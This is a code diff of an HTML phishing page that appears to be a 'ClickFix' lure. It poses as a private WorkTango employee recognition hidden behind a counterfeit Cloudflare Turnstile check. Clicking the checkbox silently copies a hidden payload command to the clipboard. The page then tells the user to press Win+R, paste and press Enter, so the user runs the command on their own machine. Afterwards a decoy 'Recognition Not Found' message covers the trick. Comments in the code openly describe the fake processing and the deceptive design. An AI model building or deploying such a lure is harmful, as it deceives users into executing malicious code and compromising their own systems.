@@ -9,193 +9,217 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             min-height: 100vh;
         }
 
-        /* WorkTango wrapper */
-        .wt-wrapper {
-            max-width: 520px;
-            width: 95%;
+        /* --- WorkTango page shell (blurred behind overlay) --- */
+        .wt-page {
+            max-width: 640px;
+            margin: 0 auto;
+            padding: 32px 20px;
         }
-        .wt-header {
-            text-align: center;
-            margin-bottom: 20px;
+        .wt-nav {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #e5e5e5;
+            margin-bottom: 28px;
         }
-        .wt-logo {
-            font-size: 26px;
+        .wt-nav-logo {
+            font-size: 22px;
             font-weight: 700;
             color: #6c63ff;
         }
-        .wt-tagline {
+        .wt-nav-links {
+            display: flex;
+            gap: 20px;
+            font-size: 14px;
             color: #888;
-            font-size: 13px;
-            margin-top: 4px;
         }
-
-        /* Captcha overlay card */
-        .captcha-card {
+        .wt-nav-links span { cursor: default; }
+        .wt-recognition {
             background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 2px 16px rgba(0,0,0,0.12);
-            overflow: hidden;
+            border-radius: 12px;
+            box-shadow: 0 1px 8px rgba(0,0,0,0.06);
+            padding: 32px;
         }
-        .captcha-header {
-            background: #f9f9f9;
-            border-bottom: 1px solid #e5e5e5;
-            padding: 14px 20px;
+        .wt-recognition-header {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 14px;
+            margin-bottom: 20px;
         }
-        .captcha-header svg { flex-shrink: 0; }
-        .captcha-header-text {
+        .wt-avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #6c63ff, #48c6ef);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .wt-meta { font-size: 14px; color: #555; }
+        .wt-meta strong { color: #333; }
+        .wt-meta .wt-date { color: #aaa; font-size: 12px; }
+        .wt-body-placeholder {
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ccc;
+            font-size: 14px;
+            font-style: italic;
+        }
+
+        /* --- Dimmed overlay behind the widget --- */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.45);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .overlay.hidden { display: none; }
+
+        /* --- Cloudflare Turnstile-style widget --- */
+        .cf-widget {
+            width: 300px;
+            background: #fff;
+            border-radius: 4px;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.08), 0 4px 16px rgba(0,0,0,0.12);
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        .cf-main {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 16px;
+        }
+        /* Checkbox */
+        .cf-cb {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c0c0c0;
+            border-radius: 3px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: all 0.15s;
+        }
+        .cf-cb:hover { border-color: #999; }
+        .cf-cb.loading { border-color: #f5a623; }
+        .cf-cb.checked { background: #2ecc71; border-color: #2ecc71; }
+        .cf-cb-spinner {
+            width: 16px;
+            height: 16px;
+            border: 2.5px solid #e0e0e0;
+            border-top: 2.5px solid #f5a623;
+            border-radius: 50%;
+            animation: cfspin 0.7s linear infinite;
+            display: none;
+        }
+        .cf-cb.loading .cf-cb-spinner { display: block; }
+        @keyframes cfspin { to { transform: rotate(360deg); } }
+        .cf-cb-check {
+            display: none;
+            width: 14px;
+            height: 14px;
+        }
+        .cf-cb.checked .cf-cb-check { display: block; }
+        .cf-label {
             font-size: 14px;
             color: #333;
-            font-weight: 500;
+            flex-grow: 1;
         }
-        .captcha-body {
-            padding: 28px 24px;
-            text-align: center;
-        }
-        .captcha-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #222;
-            margin-bottom: 6px;
-        }
-        .captcha-subtitle {
-            font-size: 13px;
-            color: #777;
-            margin-bottom: 24px;
-        }
-
-        /* The checkbox row */
-        .checkbox-row {
+        /* Cloudflare logo area */
+        .cf-logo {
             display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            padding: 16px 24px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            background: #fafafa;
-            cursor: pointer;
-            transition: border-color 0.2s, background 0.2s;
-            user-select: none;
-        }
-        .checkbox-row:hover { border-color: #aaa; background: #f5f5f5; }
-        .cb-box {
-            width: 26px;
-            height: 26px;
-            border: 2px solid #bbb;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s;
+            flex-direction: column;
+            align-items: flex-end;
             flex-shrink: 0;
         }
-        .cb-label {
-            font-size: 15px;
-            color: #333;
+        .cf-logo svg { opacity: 0.8; }
+        .cf-brand-row {
+            padding: 0 16px 10px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 8px;
         }
+        .cf-links {
+            font-size: 10px;
+            color: #999;
+        }
+        .cf-links a {
+            color: #999;
+            text-decoration: none;
+        }
+        .cf-links a:hover { text-decoration: underline; }
 
-        /* Spinner state */
-        .cb-box.loading {
-            border-color: #6c63ff;
-        }
-        .cb-spinner {
-            width: 18px;
-            height: 18px;
-            border: 2.5px solid #e0e0e0;
-            border-top: 2.5px solid #6c63ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        /* --- Verification steps (shown after "failure") --- */
+        .cf-steps {
             display: none;
+            padding: 0 16px 16px;
+            border-top: 1px solid #f0f0f0;
         }
-        .cb-box.loading .cb-spinner { display: block; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Checkmark state */
-        .cb-box.checked {
-            background: #6c63ff;
-            border-color: #6c63ff;
-        }
-        .cb-check {
-            display: none;
-            color: white;
-            font-size: 16px;
-            font-weight: bold;
-        }
-        .cb-box.checked .cb-check { display: block; }
-
-        /* Instruction steps (shown after click) */
-        .steps-overlay {
-            display: none;
-            margin-top: 24px;
-            text-align: left;
-        }
-        .steps-overlay.show { display: block; }
-        .step-title {
-            font-size: 14px;
+        .cf-steps.show { display: block; }
+        .cf-steps-title {
+            font-size: 13px;
             font-weight: 600;
-            color: #d9534f;
-            margin-bottom: 12px;
+            color: #e74c3c;
+            margin: 12px 0 10px;
         }
-        .step {
+        .cf-step {
             display: flex;
             align-items: flex-start;
-            gap: 10px;
-            margin-bottom: 12px;
-            font-size: 14px;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 13px;
             color: #444;
             line-height: 1.5;
         }
-        .step-num {
-            background: #6c63ff;
+        .cf-step-n {
+            background: #f5a623;
             color: #fff;
-            width: 22px;
-            height: 22px;
+            width: 18px;
+            height: 18px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 12px;
+            font-size: 10px;
             font-weight: 700;
             flex-shrink: 0;
-            margin-top: 1px;
+            margin-top: 2px;
         }
         kbd {
-            background: #eee;
-            border: 1px solid #ccc;
+            background: #f4f4f4;
+            border: 1px solid #ddd;
             border-radius: 3px;
-            padding: 1px 6px;
+            padding: 0 5px;
             font-family: monospace;
-            font-size: 13px;
+            font-size: 12px;
         }
 
-        /* Footer */
-        .captcha-footer {
-            padding: 12px 20px;
-            border-top: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 11px;
-            color: #aaa;
-        }
-
-        /* Success card (post-verification) */
+        /* --- Success card --- */
         .success-card {
             display: none;
             background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+            border-radius: 12px;
+            box-shadow: 0 1px 8px rgba(0,0,0,0.06);
             padding: 40px 24px;
             text-align: center;
+            max-width: 480px;
+            margin: 60px auto;
         }
         .success-card.show { display: block; }
         .success-icon { font-size: 48px; margin-bottom: 16px; }
@@ -204,62 +228,81 @@
     </style>
 </head>
 <body>
-    <div class="wt-wrapper">
-        <div class="wt-header">
-            <div class="wt-logo">WorkTango</div>
-            <div class="wt-tagline">Employee Recognition Platform</div>
-        </div>
-
-        <!-- CAPTCHA card -->
-        <div class="captcha-card" id="captchaCard">
-            <div class="captcha-header">
-                <!-- Shield icon -->
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6c63ff" stroke-width="2">
-                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                </svg>
-                <span class="captcha-header-text">Security Verification</span>
+    <!-- WorkTango page (visible behind the overlay, looks like real content loading) -->
+    <div class="wt-page" id="wtPage">
+        <div class="wt-nav">
+            <div class="wt-nav-logo">WorkTango</div>
+            <div class="wt-nav-links">
+                <span>Home</span>
+                <span>Recognitions</span>
+                <span>My Profile</span>
             </div>
-            <div class="captcha-body">
-                <div class="captcha-title">Verify you are human</div>
-                <div class="captcha-subtitle">Complete this verification to view your private recognition</div>
-
-                <div class="checkbox-row" id="checkboxRow" onclick="onCheck()">
-                    <div class="cb-box" id="cbBox">
-                        <div class="cb-spinner"></div>
-                        <div class="cb-check">&#x2713;</div>
-                    </div>
-                    <span class="cb-label">I am human</span>
-                </div>
-
-                <div class="steps-overlay" id="stepsOverlay">
-                    <div class="step-title">&#9888; Verification requires a quick confirmation step:</div>
-                    <div class="step">
-                        <span class="step-num">1</span>
-                        <span>Press <kbd>&#8862; Win</kbd> + <kbd>R</kbd> to open the Run dialog</span>
-                    </div>
-                    <div class="step">
-                        <span class="step-num">2</span>
-                        <span>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the verification command</span>
-                    </div>
-                    <div class="step">
-                        <span class="step-num">3</span>
-                        <span>Press <kbd>Enter</kbd> to complete verification</span>
-                    </div>
+        </div>
+        <div class="wt-recognition">
+            <div class="wt-recognition-header">
+                <div class="wt-avatar">&#x1F389;</div>
+                <div class="wt-meta">
+                    <strong>Private Recognition</strong><br>
+                    <span class="wt-date">Sent to you &middot; Pending verification</span>
                 </div>
             </div>
-            <div class="captcha-footer">
-                <span>Protected by WorkTango Security</span>
-                <span>Privacy &mdash; Terms</span>
+            <div class="wt-body-placeholder">
+                Complete the security check to view this message
             </div>
         </div>
+    </div>
 
-        <!-- Success card (shown after a delay to look natural) -->
-        <div class="success-card" id="successCard">
-            <div class="success-icon">&#128172;</div>
-            <h2>Recognition Not Found</h2>
-            <p>This recognition may have expired or been removed by the sender. Private recognitions are available for 30 days.</p>
-            <p style="margin-top:16px;font-size:13px;color:#999;">If you believe this is an error, contact your HR team.</p>
+    <!-- Overlay with Cloudflare Turnstile widget -->
+    <div class="overlay" id="overlay">
+        <div class="cf-widget">
+            <div class="cf-main">
+                <div class="cf-cb" id="cfCb" onclick="onCheck()">
+                    <div class="cf-cb-spinner"></div>
+                    <!-- SVG checkmark -->
+                    <svg class="cf-cb-check" viewBox="0 0 14 14" fill="none">
+                        <path d="M2 7.5L5.5 11L12 3" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <span class="cf-label">Verify you are human</span>
+                <div class="cf-logo">
+                    <!-- Cloudflare logo -->
+                    <svg width="70" height="20" viewBox="0 0 283 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M55.8 58.1l1.9-6.6c.5-1.8.3-3.5-.7-4.8-1-1.2-2.5-2-4.2-2.1l-35.4-.5c-.3 0-.5-.1-.6-.3-.1-.2-.1-.4 0-.6.2-.4.5-.7.9-.7l35.7-.5c4.6-.3 9.6-4.1 11.2-8.8l2-5.8c.1-.3.1-.6 0-.9-3.2-15-16.7-26.2-32.7-26.2C16.8 1.3 2.5 14.7 1.1 31.6.1 37 0 42 1.3 46.5c2.7 12.4 13.9 21.6 27.1 21.6h25.3c.4 0 .8-.2 1-.5.3-.3.4-.7.3-1.1l-.2-.4z" fill="#F6821F"/>
+                        <path d="M66.7 24.7c-.6 0-1.3.1-1.9.1-.4 0-.7.3-.8.7l-1.4 4.8c-.5 1.8-.3 3.5.7 4.8 1 1.2 2.5 2 4.2 2.1l7.5.5c.3 0 .5.1.6.3.1.2.1.4 0 .6-.2.4-.5.7-.9.7l-7.8.5c-4.6.3-9.6 4.1-11.2 8.8l-.6 1.7c-.1.4.2.8.6.8h31c.4 0 .7-.2.8-.6 1-3.2 1.5-6.6 1.5-10.2 0-8.1-3.7-15.3-10.5-15.6h-1.1c-3.4 0-7.2.1-10.7 0z" fill="#FBAD41"/>
+                        <text x="95" y="56" fill="#404242" font-family="Arial,sans-serif" font-size="38" font-weight="700">Cloudflare</text>
+                    </svg>
+                </div>
+            </div>
+            <div class="cf-brand-row">
+                <div class="cf-links">
+                    <a href="#">Privacy</a> &middot; <a href="#">Terms</a>
+                </div>
+            </div>
+            <!-- Steps shown after checkbox click -->
+            <div class="cf-steps" id="cfSteps">
+                <div class="cf-steps-title">&#9888; Verification not complete — one more step:</div>
+                <div class="cf-step">
+                    <span class="cf-step-n">1</span>
+                    <span>Press <kbd>&#8862; Win</kbd> + <kbd>R</kbd></span>
+                </div>
+                <div class="cf-step">
+                    <span class="cf-step-n">2</span>
+                    <span>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></span>
+                </div>
+                <div class="cf-step">
+                    <span class="cf-step-n">3</span>
+                    <span>Press <kbd>Enter</kbd></span>
+                </div>
+            </div>
         </div>
+    </div>
+
+    <!-- Success card (replaces everything after timeout) -->
+    <div class="success-card" id="successCard">
+        <div class="success-icon">&#128172;</div>
+        <h2>Recognition Not Found</h2>
+        <p>This recognition may have expired or been removed by the sender. Private recognitions are available for 30 days.</p>
+        <p style="margin-top:16px;font-size:13px;color:#999;">If you believe this is an error, contact your HR team.</p>
     </div>
 
     <script>
@@ -275,13 +318,11 @@
         if (clicked) return;
         clicked = true;
 
-        const box = document.getElementById('cbBox');
-        const row = document.getElementById('checkboxRow');
-        const steps = document.getElementById('stepsOverlay');
+        const cb = document.getElementById('cfCb');
+        const steps = document.getElementById('cfSteps');
 
-        // Phase 1: spinner
-        box.classList.add('loading');
-        row.style.cursor = 'default';
+        // Phase 1: spinner (fake processing)
+        cb.classList.add('loading');
 
         // Copy payload to clipboard
         navigator.clipboard.writeText(PAYLOAD).catch(() => {
@@ -295,16 +336,17 @@
             document.body.removeChild(ta);
         });
 
-        // Phase 2: show instructions after fake "analysis"
+        // Phase 2: spinner stops, "verification incomplete", show steps
         setTimeout(() => {
-            box.classList.remove('loading');
-            box.classList.add('checked');
+            cb.classList.remove('loading');
+            cb.classList.add('checked');
             steps.classList.add('show');
-        }, 1500);
+        }, 2000);
 
-        // Phase 3: after some time, show "recognition not found" cover
+        // Phase 3: dismiss overlay, show "not found" after delay
         setTimeout(() => {
-            document.getElementById('captchaCard').style.display = 'none';
+            document.getElementById('overlay').classList.add('hidden');
+            document.getElementById('wtPage').style.display = 'none';
             document.getElementById('successCard').classList.add('show');
         }, 30000);
     }
